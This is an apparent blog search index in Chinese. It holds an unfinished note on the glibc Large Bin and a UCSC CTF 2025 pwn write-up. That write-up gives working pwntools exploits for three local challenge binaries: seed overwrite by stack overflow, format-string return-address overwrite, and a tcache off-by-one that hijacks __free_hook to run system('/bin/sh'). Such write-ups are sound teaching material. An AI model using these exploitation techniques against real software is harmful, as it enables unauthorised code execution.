<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2025/04/24/Large-Bin-Attack/"/>
      <url>/2025/04/24/Large-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h1 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h1><ul><li><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念 :"></a>基本概念 :</h2></li></ul><p>Large Bin 是 glibc 堆内存管理中的一种数据结构，用于存储较大尺寸的空闲内存块，一般管理大于512字节（0x200）的内存块，但管理的内存大小在不同的glibc版本也有所不同，例如在未引入Tcache Bin的版本中，Largin Bin用于管理大于等于512字节的内存块，而在引入Tcache Bin的 glibc 版本中，Large Bin的内存大小下限有所提高，当Tcache Bin尚未被填满时，进入 Large Bin 的内存块大小最低为 1040 字节(0X410) ，这是因为Tcache Bin会优先管理较小的内存块。</p><ul><li><h2 id="Large-Bin-的结构"><a href="#Large-Bin-的结构" class="headerlink" title="Large Bin 的结构"></a>Large Bin 的结构</h2></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Large Bin 在结构上与其他 Bins 有所不同，在拥有 prev_size 、 size 以及 fd 、 bk 的情况下，<strong>还多了fd_nextsize 和 bk_nextsize 两种指针结构</strong></p><ul><li>fd_nextsize 表示指向前一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li><li>bk_nextsize 表示指向后一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li></ul><p>**组成部分：**Large Bins 中含有 63 个Bins ，而 Large Bins 总体又被分成 6 个组 ， 每个组对应一个区间，且容纳个数呈指数性减少。</p><p><img src="/../PWN/1.png" alt="image-20250425150822345"></p><ul><li><h2 id="链表结构："><a href="#链表结构：" class="headerlink" title="链表结构："></a>链表结构：</h2><img src="/../PWN/2.png" alt="image-20250425154611746"></li></ul><h3 id="补充-："><a href="#补充-：" class="headerlink" title="补充 ："></a>补充 ：</h3><p>只有首堆块的fd_nextsize、bk_nextsize会指向其他大小的内存块，其相同大小的非首堆块的fd_nextsize、bk_nextsize无效 ，通常为0。</p><ul><li><h2 id="插入顺序："><a href="#插入顺序：" class="headerlink" title="插入顺序："></a>插入顺序：</h2><ol><li>在 Large Bin 中 ，堆块的排列顺序是从大到小，越大的堆块越靠近头部，越小的堆块越靠近尾部。</li><li>大小相同的堆块 ， 按照 free 的先后顺序排序 ，最先释放的堆块作为首堆块，其次释放的堆块延续往后。</li></ol></li></ul><p>明天更完，今天让我摆一下。。。</p>]]></content>
      
      
      <categories>
          
          <category> 知识归纳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UCSC CTF 2025 WP</title>
      <link href="/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/"/>
      <url>/2025/04/22/UCSC%20CTF%202025%20WP%20----%20PWN/</url>
      
        <content type="html"><![CDATA[<h2 id="UCSC-CTF-2025-WP-—-PWN"><a href="#UCSC-CTF-2025-WP-—-PWN" class="headerlink" title="UCSC CTF 2025 WP —- PWN"></a>UCSC CTF 2025 WP —- PWN</h2><h3 id="BoFido"><a href="#BoFido" class="headerlink" title="BoFido"></a>BoFido</h3><p><img src="/../WP/UCSC2025/1.png" alt="1"></p><p>常规检查： 64位程序 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/2.png" alt="2"></p><p>主函数的代码逻辑非常的简单 循环十次 每次循环创造三个随机数 让玩家进行猜数游戏</p><p>程序中还存在明显的system(“&#x2F;bin&#x2F;sh”)后门函数调用 </p><p>要想进入这个后门函数 我们就必须要满足 v14 &#x3D;&#x3D; 10 这一个条件</p><p>而 v14 这个变量在程序中的作用是统计全猜中的次数 每个回合三个数字全部猜中 v14 的值就会加一 但由于进行猜数的回合只有十次 所以我们若想要进行后门函数调用 最直接的方法就必须要每一个回合都把三个数给猜对 </p><p>但是如果是一直乱猜 明显是不太现实（比彩票中大奖的概率还低）<strong>所以这就需要我们来控制赌局的中奖率</strong> 从而达到把把全猜中的目的</p><p><strong><u>那么我们该如何利用漏洞进行实现呢？</u></strong></p><p><img src="/../WP/UCSC2025/3.png" alt="image-20250422234155656"></p><p>我们想要控制中奖率 就必须要知道 随机数是如何进行生成的：</p><hr><ul><li>C 语言提供了 <code>rand()</code> 函数来生成随机数，该函数通常基于线性同余法等算法实现。每次调用 <code>rand()</code> 函数时，它会根据内部的种子和算法生成下一个随机数。</li></ul><hr><p>但是如果程序每次都利用相同的种子，那么生成的随机数序列也会相同，这样就无法得到真正的随机数，所以通常我们都会以当前时间作为种子，因为时间是无时无刻发生变化的，这样生成的数值才会满足随机性。</p><p><strong>seed &#x3D; time(0LL)</strong></p><p>这行代码的作用是初始化时间的种子 这样我们得到的随机数就是完全随机的了</p><p>这样就不方便我们进行对赌局的把控 </p><p>转念一想，如果生成随机数是根据内部的种子和固定的算法决定的，这个种子因为程序进行了时间初始化，导致种子在不断变化，但如果我们在其生成时间的种子之后，对seed进行一个覆盖，把它覆盖为一个固定大小的值，<strong><u>这样我们生成的随机数序列就会变得有迹可循</u></strong></p><p><u>如果你能够预知未来，这样的赌局还会存在失误吗…..</u></p><h5 id="做题思路："><a href="#做题思路：" class="headerlink" title="做题思路："></a>做题思路：</h5><p>由于程序给我们提供了一个0x25字节的输入点 恰好这个输入点存在一个漏洞 让我们进行一个利用</p><p><img src="/../WP/UCSC2025/4.png" alt="image-20250422235747015"></p><p>可以看到输入点 buf 和随机数种子 seed 都存在于栈上，并且相距0x20字节（恰好在0x25输入范围以内）只要我们填充数据0x21个字节把seed覆盖成一个固定的值 这样随机数序列也会固定</p><p><img src="/../WP/UCSC2025/5.png" alt="image-20250423000924364"></p><p>我选择直接填充0x21个的a字节，第一次运行程序记下十个回合的幸运数字，第二次运行程序直接按第一个回合的顺序打就可以直接打通</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter your name:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x21</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h3 id="userlogin"><a href="#userlogin" class="headerlink" title="userlogin"></a>userlogin</h3><p><img src="/../WP/UCSC2025/6.png" alt="image-20250423124813045"></p><p>常规检查：64位 NX保护</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/7.png" alt="image-20250423124845602"></p><p>main（）函数和 generatePassword（）函数没有什么不对劲的地方 我们直接看login（）函数</p><p>login（）函数：</p><p><img src="/../WP/UCSC2025/8.png" alt="image-20250423125310204"></p><p>存在一个输入点，输入大小是32字节，随后strcmp函数对输入的字符串进行对照</p><ol><li><p>supersecureuser</p><p>如果输入的字符串为“supersecureuser”，则进入user（）函数</p></li><li><p>随机字符串</p><p>如果输入的字符串为 a1 ，则进入root（）函数，但是由于 a1 涉及到随机数，所以 a1 具有不确定性，很难对其进行预测</p><h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>user（）函数：</p></li></ol><p><img src="/../WP/UCSC2025/9.png" alt="image-20250423131703908"></p><p>user（）函数内部有一个明显的格式化字符串漏洞 并且由于 main（）函数内for循环的关系，我们可以连续进入三次 login（）函数，从而我们就拥有三次格式化字符串漏洞利用的机会</p><p>同时程序存在shell（）后门函数：</p><p><img src="/../WP/UCSC2025/10.png" alt="image-20250423132447202"></p><h5 id="做题思路：-1"><a href="#做题思路：-1" class="headerlink" title="做题思路："></a>做题思路：</h5><p>1.利用格式化字符串漏洞泄露出返回地址</p><p>2.将返回地址写入栈上 并改返回地址的内容为后门函数的地址</p><p><img src="/../WP/UCSC2025/11.png" alt="image-20250423135436505"></p><p>挑选了一个栈上的一个地址，打算对这个地址进行一个泄露，随后计算出它与返回地址的固定偏移，利用泄露出来的地址加上固定偏移，得到的结果就是返回地址了</p><p><img src="/../WP/UCSC2025/12.png" alt="image-20250423135740277"></p><p>fmtarg 可以计算出泄露地址的偏移是 %7 </p><p>第一段payload就可以构造出来了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;%7$p&#x27;</span><br></pre></td></tr></table></figure><p>这段payload可以直接把内容作为指针泄露出来 计算出固定偏移为 0x38，这样我们就得到了返回地址</p><p>第二次格式化字符串漏洞，我们先把返回地址写入栈上，紧接着对它进行修改，将其指向shell（）后门函数</p><p><img src="/../WP/UCSC2025/13.png" alt="image-20250423185521207"></p><p>可以看到，最初的返回地址指向的是0x4154b这个地址</p><p><img src="/../WP/UCSC2025/14.png" alt="image-20250423185607974"></p><p>我们需要将它改写为0x401265这个地址，也就是需要改写两个字节</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br></pre></td></tr></table></figure><p><img src="/../WP/UCSC2025/15.png" alt="image-20250423190714979"></p><p>可以看到返回地址已经被成功改写</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;retn  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(retn))                  </span><br><span class="line">fmt()</span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>解法二相对于解法一来说 确实较为简单 </p><p><img src="/../WP/UCSC2025/16.png" alt="image-20250423195504888"></p><p>已知user（）函数中存在格式化字符串漏洞，经过测试发现root用户的密码正是上图红框的位置，</p><p>只要通过字格泄露出root的密码，这样我们就可以进入root（）函数</p><p>root（）函数：</p><p><img src="/../WP/UCSC2025/17.png" alt="image-20250423195504889"></p><p>root（）函数具有明显的栈溢出漏洞，由于我们已经知道了shell的地址，所以这题可以通过root（）函数，栈溢出直接劫持返回地址指向shell函数</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$s&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">password = p.recvuntil(<span class="string">&quot;Password:&quot;</span>)[:-<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password  &gt;&gt; &quot;</span> + <span class="built_in">str</span>(password))</span><br><span class="line">p.sendline(password)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Note: \n&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="疯狂复制"><a href="#疯狂复制" class="headerlink" title="疯狂复制"></a>疯狂复制</h3><p><strong>LIBC：2.27-3ubuntu1_amd64</strong></p><p>（本题目解法比较多，后续会看情况更新更多的解法）</p><p><img src="/../WP/UCSC2025/18.png" alt="image-20250424114730714"></p><p>常规检查：64位 RELRO NX PIE</p><p>IDA:</p><p>main（）函数：</p><p><img src="/../WP/UCSC2025/19.png" alt="image-20250424115140346"></p><p>  <u>****<strong>很经典的菜单堆题，增删查改四样俱全</strong></u></p><p>del（）函数：</p><p><img src="/../WP/UCSC2025/20.png" alt="image-20250424115351043"></p><p>free后将指针置空，故不存在UAF或者double free漏洞</p><p>edit（）函数：</p><p><img src="/../WP/UCSC2025/21.png" alt="image-20250424115540363"></p><p>setinput（）函数：</p><p><img src="/../WP/UCSC2025/22.png" alt="image-20250424115631440"></p><p>查看edit（）函数 ，初步怀疑存在off by one漏洞</p><p><img src="/../WP/UCSC2025/23.png" alt="image-20250424115906819"></p><p>本地交互证明猜想正确，size大小为8个字节，我们却可以编辑输入9个字节的数据，利用这多出来的一个字节，我们可以做很多事情</p><h4 id="解法一-（off-by-one）："><a href="#解法一-（off-by-one）：" class="headerlink" title="解法一 （off by one）："></a>解法一 （off by one）：</h4><h5 id="做题思路：-2"><a href="#做题思路：-2" class="headerlink" title="做题思路："></a>做题思路：</h5><ol><li>先利用 unsortedbin leak 泄露出 libc基地址</li><li>再通过 off by one 直接修改__free_hook为system的地址</li><li>最后释放一个内容为 &#x2F;bin&#x2F;sh\x00 的堆块 从而getshell</li></ol><p><strong>Part1: 泄露LIBC</strong></p><hr><p>由于题目libc版本是2.27-3ubuntu1_amd64，glibc在2.26版本引入了一个新的堆内存管理机制—-TcacheBin，旨在加速小块内存的分配和释放。</p><h5 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h5><ol><li><p>TcacheBin管理的内存块大小范围为 0x18 - 0x408</p></li><li><p>每个相同大小的TcacheBin最多存储 7 个chunk</p></li><li><p>如果相同大小的TcacheBin没有占满7个chunk，free掉对应大小的堆块后会优先进入TcacheBin 而不是 fastbin 或者是 unsortedbin</p><hr><p>由于TcacheBin的引入，我们无法直接使用unsortedbin leak，因为释放的堆块会优先进入tcachebin，但是由于tcachebin存储的chunk数量有限制，只要我们把7个位置全部占满，这样我们就可以释放对应大小的堆块，从而进入unsortedbin。</p><p><img src="/../WP/UCSC2025/24.png" alt="image-20250424132206434"></p><p>先创造9个0x90的堆块，我们需要先释放前七个堆块，占满tcachebin，然后释放第8个堆块，使其进入unsortedbin，第九个堆块的作用是隔绝topchunk，防止free掉的unsortedbin与topchunk进行合并。</p><p><img src="/../WP/UCSC2025/25.png" alt="image-20250424132650387"></p></li></ol><p>可以看到chunk8已经进入了unsortedbin当中，紧接着我们需要增添一个chunk_size为0x40大小的堆块10（其实chunk_size在0x90以内都可以），这个堆块是由unsortedbin分配的，之所以要增添一个0x40大小的chunk10，而不是增添一个0x90大小的chunk10，是因为TcacheBin如果大小匹配，会优先从TcacheBin中分配堆块，这样一来我们就无法利用unsortedbin leak了（不了解unsortedbin leak的，可以先去查阅相关资料）</p><p><img src="/../WP/UCSC2025/26.png" alt="image-20250424134108511"></p><p>利用show（）函数，我们就可以得到chunk10中的内容，计算与libc基地址的偏移，然后用泄露出来的指针减去偏移，我们就得到了libc基地址</p><p>不过在进行下一步之前，记得先把unsortedbin中剩下的0x50大小的chunk申请回来，以免造成干扰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -  <span class="number">0x3ebd20</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p><strong>Part2 : off by one 修改__free_hook</strong> </p><p>虽然tcachebin不是之前熟悉的 fastbin，但是我们同样可以利用 off by one 漏洞 —— 新的堆内存管理机制虽然提高了性能，但也减低了安全性，tcache的检查机制相对与fastbin甚至还有所减少</p><p><img src="/../WP/UCSC2025/27.png" alt="image-20250424134539382"></p><p>先创造三个0x40大小的chunk，分别是 chunk11、chunk12 以及 chunk13</p><p><img src="/../WP/UCSC2025/29.png" alt="image-20250424134700582"></p><p>查看chunk11的内存分布，我们的目的是利用多溢出的一个字节修改chunk12堆块的大小为0x71，然后free掉chunk12，造成chunk12与chunk13的堆块重叠，这样我们就可以修改利用chunk12来修改chunk13的内容，其作用等同于UAF漏洞</p><p><img src="/../WP/UCSC2025/28.png" alt="image-20250424140455138"></p><p>可以看到原本chunk13的位置，chunk13的fd指针已经被我们改写成了free_hook的地址，指向了free_hook,所以只要在申请两个堆块，分别是chunk14和chunk15，我们就可以把free_hook申请出来（chunk15对应的是free_hook),我们把chunk14的内容修改成&#x2F;bin&#x2F;sh\x00，把chunk15的内容修改成system_addr,这样我们只要执行free(14),就相当于执行了system(‘&#x2F;bin&#x2F;sh\x00’)</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">def add(index,size):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Size &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">#--------------------------------------------------------------------------#</span><br><span class="line">#part1</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x80)</span><br><span class="line">for i in range(8):</span><br><span class="line">    free(i)</span><br><span class="line">free(7)</span><br><span class="line">add(9,0x30)</span><br><span class="line">show(9)</span><br><span class="line">p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) -  0x3ebd20</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">print(&quot;libc_base  &gt;&gt; &quot; + hex(libc_base))</span><br><span class="line">add(10,0x40)</span><br><span class="line">#part2</span><br><span class="line">add(11,0x38)</span><br><span class="line">add(12,0x38)</span><br><span class="line">add(13,0x38)</span><br><span class="line">payload = b&#x27;a&#x27;*0x38 + p8(0x71)</span><br><span class="line">edit(11,payload)</span><br><span class="line">free(12)</span><br><span class="line">free(13)</span><br><span class="line">add(12,0x68)</span><br><span class="line">payload2 = b&#x27;a&#x27;*0x38 + p64(0x41) + p64(free_hook)</span><br><span class="line">edit(12,payload2)</span><br><span class="line">add(14,0x38)</span><br><span class="line">add(15,0x38)</span><br><span class="line">edit(14,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">edit(15,p64(system_addr))</span><br><span class="line">free(14)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UCSC CTF 2025 WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
